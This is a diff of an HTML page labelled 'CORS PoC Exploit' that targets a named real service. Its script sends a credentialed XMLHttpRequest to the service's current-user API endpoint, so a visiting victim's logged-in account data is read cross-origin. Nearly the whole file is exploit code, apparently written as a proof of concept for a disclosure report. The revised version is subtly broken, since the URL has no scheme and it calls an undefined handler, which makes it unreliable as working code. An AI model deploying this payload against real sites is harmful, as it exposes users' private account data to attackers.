@@ -1,27 +1,25 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-document.getElementById("emo").innerHTML = alert(this.responseText);
-}
-};
-xhttp.open("GET", "https://learn.acronis.com/api/platform/v1/users/me", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
+    <script>
+        function cors() {
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get', 'learn.acronis.com/api/platform/v1/users/me', true);
+            req.withCredentials = true;
+            req.send();
+        }
+    </script>
 </head>
+
 <body>
-<center>
-<h2>CORS PoC Exploit </h2>
-<h3>created by <a href="linkedin.com/in/rijin-raj-125bab74">@Rijin</a></h3>
-<h3>Show full content of page</h3>
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
+    <center>
+        <h2>CORS PoC Exploit </h2>
+        <h3>Show full page's content</h3>
+        <div id="demo">
+            <button type="button" onclick="cors()">Exploit</button>
+        </div>
 </body>
-</html> disclosure reports
+
+</html>
